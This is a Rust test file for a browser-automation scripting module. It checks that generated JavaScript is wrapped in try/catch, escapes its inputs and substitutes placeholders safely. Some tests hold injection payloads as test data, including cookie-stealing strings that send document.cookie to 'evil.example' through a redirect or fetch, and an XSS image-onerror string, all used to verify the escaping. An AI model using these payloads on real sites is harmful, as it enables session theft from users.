//! Script assembly: the try/catch wrapper and the encoding. Included by `script.rs`.

use super::*;

/// Every script the module produces, for the properties that must hold of all
/// of them.
fn every_script() -> Vec<String> {
    vec![
        init_script(DEFAULT_MESSAGE_LIMIT),
        page_text_script(),
        read_page_script(200),
        click_script("e1").unwrap(),
        type_script("e1", "hello").unwrap(),
        press_key_script("Enter").unwrap(),
    ]
}

// ---------------------------------------------------------------------------
// The wrapper — the Windows exception-swallowing rule
// ---------------------------------------------------------------------------

#[test]
fn every_script_is_wrapped_in_try_catch() {
    // `eval_with_callback` ignores exceptions on Windows: a throwing script
    // fires the callback with the literal string `null`, indistinguishable from
    // a script that returned null. So an unwrapped script reports an empty page
    // rather than failing.
    for script in every_script() {
        assert!(script.contains("try"), "{script}");
        assert!(script.contains("catch"), "{script}");
    }
}

#[test]
fn every_evaluated_script_answers_in_the_ok_envelope() {
    // The init script is fire-and-forget and returns nothing; the rest are
    // evaluated for a value and must be readable as an outcome.
    for script in [
        page_text_script(),
        read_page_script(10),
        click_script("e1").unwrap(),
        type_script("e1", "x").unwrap(),
        press_key_script("Tab").unwrap(),
    ] {
        assert!(script.contains("ok:true"), "no success arm in {script}");
        assert!(
            script.contains("ok:false") || script.contains("\\\"ok\\\":false"),
            "no failure arm in {script}"
        );
    }
}

#[test]
fn the_catch_arm_survives_a_thrown_non_error() {
    // A page can `throw 7` or `throw null`. Reaching for `.message` on that
    // inside a catch block is how a catch block throws.
    let script = page_text_script();
    assert!(script.contains("(e&&e.message)||e"), "{script}");
}

#[test]
fn the_catch_arm_has_its_own_fallback_for_an_unstringifiable_error() {
    let script = page_text_script();
    assert!(script.contains("unstringifiable error"), "{script}");
}

// ---------------------------------------------------------------------------
// Encoding — the injection boundary
// ---------------------------------------------------------------------------

#[test]
fn a_hostile_element_reference_cannot_escape_into_the_script() {
    // The literal attack: close the string, run something, comment out the rest.
    let hostile = r#"");alert(document.cookie);//"#;
    let script = click_script(hostile).unwrap();
    // The payload text is of course still in the script — it is the argument.
    // What matters is that its leading quote did not *close* the literal, so
    // `alert` is data inside a string rather than a statement.
    assert!(
        !script.contains(r#"get("");alert"#),
        "the payload closed its string literal: {script}"
    );
    assert!(
        script.contains(r#"get("\");alert"#),
        "expected the quote to be escaped: {script}"
    );
}

#[test]
fn a_hostile_typed_string_cannot_escape_into_the_script() {
    let script = type_script(
        "e1",
        r#"a";window.location="https://evil.example/"+document.cookie;//"#,
    )
    .unwrap();
    assert!(
        !script.contains(r#"= "a";window.location"#),
        "the payload closed its string literal: {script}"
    );
    assert!(
        script.contains(r#"= "a\";window.location"#),
        "expected the quote to be escaped: {script}"
    );
}

#[test]
fn json_string_escapes_the_quote_and_the_backslash() {
    assert_eq!(json_string(r#"a"b"#), r#""a\"b""#);
    assert_eq!(json_string(r"a\b"), r#""a\\b""#);
}

#[test]
fn json_string_escapes_the_html_significant_characters() {
    // `</script>` inside a JavaScript string literal still ends a `<script>`
    // element, so this matters wherever a script is placed in a document.
    let encoded = json_string("</script><img src=x onerror=alert(1)>");
    assert!(!encoded.contains('<'), "{encoded}");
    assert!(!encoded.contains('>'), "{encoded}");
    assert!(encoded.contains("\\u003c"), "{encoded}");
    assert!(encoded.contains("\\u003e"), "{encoded}");
}

#[test]
fn json_string_escapes_the_ampersand() {
    let encoded = json_string("a&amp;b");
    assert!(!encoded.contains('&'), "{encoded}");
    assert!(encoded.contains("\\u0026"), "{encoded}");
}

#[test]
fn json_string_escapes_the_two_unicode_line_terminators() {
    // Older engines treat these as line breaks *inside* a string literal, which
    // is a syntax error at best and a statement boundary at worst.
    let encoded = json_string("a\u{2028}b\u{2029}c");
    assert!(!encoded.contains('\u{2028}'), "{encoded}");
    assert!(!encoded.contains('\u{2029}'), "{encoded}");
    assert!(
        encoded.contains("\\u2028") && encoded.contains("\\u2029"),
        "{encoded}"
    );
}

#[test]
fn json_string_escapes_a_newline_rather_than_emitting_it() {
    let encoded = json_string("a\nb");
    assert!(!encoded.contains('\n'), "{encoded}");
    assert!(encoded.contains("\\n"), "{encoded}");
}

#[test]
fn json_string_always_returns_a_quoted_literal() {
    for input in ["", "x", "\"", "\\", "🙂", "a\u{0}b"] {
        let encoded = json_string(input);
        assert!(
            encoded.starts_with('"') && encoded.ends_with('"'),
            "{encoded}"
        );
    }
}

#[test]
fn no_assembled_script_contains_a_raw_placeholder() {
    // The substitution-instead-of-format rule's alarm: a placeholder left
    // behind is a script that references an undefined identifier and reports
    // nothing useful.
    for script in every_script() {
        assert!(
            !script.contains("__CB_"),
            "unsubstituted placeholder in {script}"
        );
    }
}

// ---------------------------------------------------------------------------
// Typed text
// ---------------------------------------------------------------------------

#[test]
fn a_control_character_in_typed_text_is_refused_not_encoded() {
    // It would encode safely. The objection is that nobody asked to type it,
    // and an escape sequence sent to a page hosting a terminal emulator is a
    // different kind of problem.
    for (text, code) in [
        ("a\nb", 0x0Au32),
        ("a\rb", 0x0D),
        ("a\u{0}b", 0x00),
        ("a\u{1b}[2Jb", 0x1B),
        ("a\tb", 0x09),
    ] {
        match type_script("e1", text) {
            Err(ScriptError::ControlCharacter { code: got, .. }) => {
                assert_eq!(got, code, "{text:?}")
            }
            other => panic!("{text:?} -> {other:?}"),
        }
    }
}

#[test]
fn a_refused_control_character_produces_no_script_at_all() {
    // "Nothing was typed" has to be true, so the error path must not also
    // return a script the caller could run anyway.
    assert!(type_script("e1", "a\nb").is_err());
}

#[test]
fn the_control_character_error_names_the_character_and_where_it_was() {
    let error = type_script("e1", "ab\u{1b}c").unwrap_err();
    let message = error.to_string();
    assert!(message.contains("U+001B"), "{message}");
    assert!(message.contains("nothing was typed"), "{message}");
}

#[test]
fn ordinary_unicode_text_is_accepted() {
    // The refusal is control characters, not non-ASCII. Refusing the latter
    // would make the browser unusable in most of the world.
    for text in ["日本語", "naïve café", "🙂", "a b c", ""] {
        assert!(type_script("e1", text).is_ok(), "{text:?}");
    }
}

#[test]
fn an_empty_element_reference_is_refused_rather_than_blamed_on_the_page() {
    // A script querying for `""` finds nothing and reports "element not found",
    // which blames the page for the caller's empty argument.
    assert_eq!(click_script("").unwrap_err(), ScriptError::NoElementRef);
    assert_eq!(click_script("   ").unwrap_err(), ScriptError::NoElementRef);
    assert_eq!(
        type_script("", "text").unwrap_err(),
        ScriptError::NoElementRef
    );
}

#[test]
fn an_empty_key_is_refused() {
    assert_eq!(press_key_script("").unwrap_err(), ScriptError::NoKey);
    assert_eq!(press_key_script(" \t").unwrap_err(), ScriptError::NoKey);
}

#[test]
fn a_key_name_is_not_validated_against_a_list() {
    // The page decides what it recognises. A list here would be a second,
    // worse opinion than the DOM's own — the `renameLogic` rule.
    for key in ["Enter", "Escape", "Tab", "F13", "MediaPlayPause", "ß"] {
        assert!(press_key_script(key).is_ok(), "{key}");
    }
}

#[test]
fn an_element_reference_check_precedes_the_text_check() {
    // Both arguments are wrong; the caller is told about the one it can fix
    // first, and either way no script is produced.
    assert_eq!(
        type_script("", "a\nb").unwrap_err(),
        ScriptError::NoElementRef
    );
}

// ---------------------------------------------------------------------------
// The init script
// ---------------------------------------------------------------------------

#[test]
fn the_init_script_defines_exactly_one_non_configurable_global() {
    let script = init_script(DEFAULT_MESSAGE_LIMIT);
    assert!(script.contains("Object.defineProperty(window,"), "{script}");
    assert!(script.contains("configurable: false"), "{script}");
    assert!(script.contains("writable: false"), "{script}");
    // One name, and it is the documented one.
    assert_eq!(script.matches("Object.defineProperty(window,").count(), 1);
    assert!(script.contains(IPC_GLOBAL));
}

#[test]
fn the_init_script_guards_against_running_twice() {
    // An init script runs on every frame and every navigation. Re-patching
    // `console` over an already-patched one doubles every captured line.
    let script = init_script(DEFAULT_MESSAGE_LIMIT);
    assert!(
        script.contains(&format!("if (window.{IPC_GLOBAL}) {{ return; }}")),
        "{script}"
    );
}

#[test]
fn each_capture_in_the_init_script_is_independently_guarded() {
    // A script that throws half-way leaves the page instrumented in an unknown,
    // silently partial way. Six independent patches, so at least six guards.
    let script = init_script(DEFAULT_MESSAGE_LIMIT);
    assert!(
        script.matches("try {").count() >= 6,
        "expected each patch to be guarded on its own: {}",
        script.matches("try {").count()
    );
}

#[test]
fn the_init_script_caps_one_captured_message_and_admits_the_cut() {
    let script = init_script(1234);
    assert!(script.contains("var MAX = 1234;"), "{script}");
    assert!(
        script.contains("chars, cut]"),
        "the cut must be visible in the text"
    );
}

#[test]
fn the_init_script_posts_through_wrys_own_bridge() {
    let script = init_script(DEFAULT_MESSAGE_LIMIT);
    assert!(script.contains("window.ipc.postMessage"), "{script}");
}

#[test]
fn the_init_script_captures_the_two_window_error_events_under_their_own_kind() {
    // Not as console messages: `console.classify_level` would rank them `Other`.
    let script = init_script(DEFAULT_MESSAGE_LIMIT);
    assert!(script.contains("kind: 'pageError'"), "{script}");
    assert!(script.contains("'unhandledrejection'"), "{script}");
}

#[test]
fn the_init_script_labels_each_network_row_with_how_it_was_observed() {
    // The rows are not DevTools', and the difference has to survive to the
    // reader — a `resource` row has no status and never will.
    let script = init_script(DEFAULT_MESSAGE_LIMIT);
    for source in ["source: 'fetch'", "source: 'xhr'", "source: 'resource'"] {
        assert!(script.contains(source), "{source} missing");
    }
}

#[test]
fn the_init_script_keeps_the_pages_own_console_output_working() {
    // Swallowing the page's own logging would break the devtools the user might
    // still open, for no benefit.
    let script = init_script(DEFAULT_MESSAGE_LIMIT);
    assert!(
        script.contains("original.apply(console, arguments)"),
        "{script}"
    );
}

// ---------------------------------------------------------------------------
// read_page
// ---------------------------------------------------------------------------

#[test]
fn read_page_reports_the_total_and_whether_it_cut() {
    // The `text` rule again: the number is the claim the caller acts on.
    let script = read_page_script(50);
    assert!(script.contains("total:found.length"), "{script}");
    // `truncated` means the **cap** cut the list, which is the only thing the
    // "CUT" warning describes. `found.length > out.length` also becomes true
    // whenever a match was skipped for not being rendered, which is almost
    // every real page, so it fired the warning over complete outlines and made
    // a genuinely capped list indistinguishable from an ordinary one.
    assert!(
        !script.contains("truncated:found.length > out.length"),
        "the cap and the visibility filter are two facts: {script}"
    );
    assert!(script.contains("truncated:i < found.length"), "{script}");
    assert!(script.contains("var limit = 50;"), "{script}");
}

#[test]
fn read_page_and_the_action_scripts_agree_on_the_reference_store() {
    // A ref handed out by one and looked up in another must be the same map, or
    // every click reports "no element under that reference".
    let read = read_page_script(10);
    let click = click_script("e1").unwrap();
    let expected = format!("window.{IPC_GLOBAL}");
    assert!(read.contains(&expected), "{read}");
    assert!(click.contains(&expected), "{click}");
}

#[test]
fn an_action_on_a_page_with_no_instrumentation_says_so_rather_than_throwing() {
    for script in [
        read_page_script(10),
        click_script("e1").unwrap(),
        type_script("e1", "x").unwrap(),
    ] {
        assert!(
            script.contains("the page instrumentation is not installed"),
            "{script}"
        );
    }
}

#[test]
fn an_action_on_a_detached_element_is_refused_rather_than_silently_doing_nothing() {
    // A ref from a read before a re-render points at an element no longer in
    // the document. Clicking it succeeds and affects nothing, which reads as a
    // click that worked.
    for script in [click_script("e1").unwrap(), type_script("e1", "x").unwrap()] {
        assert!(script.contains("isConnected"), "{script}");
        assert!(script.contains("read the page again"), "{script}");
    }
}

#[test]
fn page_text_uses_inner_text_not_text_content() {
    // `textContent` includes `<script>`, `<style>` and every hidden element, so
    // it is not what the user is looking at.
    let script = page_text_script();
    assert!(script.contains("innerText"), "{script}");
    assert!(!script.contains("textContent"), "{script}");
}

// ---------------------------------------------------------------------------
// Substitution must never revisit its own output
// ---------------------------------------------------------------------------

#[test]
fn a_reference_that_spells_a_later_placeholder_cannot_smuggle_text_into_a_code_position() {
    // Sequential `str::replace` rescans everything the previous link emitted.
    // So a ref of `__CB_TEXT__` is emitted as the *string* `"__CB_TEXT__"`, and
    // the text substitution then rewrites the placeholder inside that already
    // emitted literal — splicing the encoded text between two quotes, i.e. into
    // a code position. `json_string` escapes `"` and `\` but not `'`, `+`, `(`
    // or `)`, so the text can be a complete expression.
    let script = type_script(
        "__CB_TEXT__",
        "+fetch('//evil.example/?c='+document.cookie)+",
    )
    .unwrap();
    // The payload is of course still in the script — it is the argument. What
    // must not happen is the ref's own literal being split open around it.
    assert!(
        !script.contains(r#"get(""+fetch"#),
        "the typed text reached a code position: {script}"
    );
    assert!(
        script.contains(r#"get("__CB_TEXT__")"#),
        "the ref should stay a plain string literal: {script}"
    );
    assert!(
        script.contains(r#"typedInto:"__CB_TEXT__""#),
        "the reported ref should stay a plain string literal: {script}"
    );
}

#[test]
fn a_typed_string_that_spells_an_earlier_placeholder_stays_data() {
    // The mirror direction: whichever order the placeholders are substituted
    // in, neither argument may be re-read as the other's placeholder.
    let script = type_script("e1", "__CB_REF__").unwrap();
    assert!(
        script.contains(r#"= "__CB_REF__";"#),
        "the typed text should stay a plain string literal: {script}"
    );
}
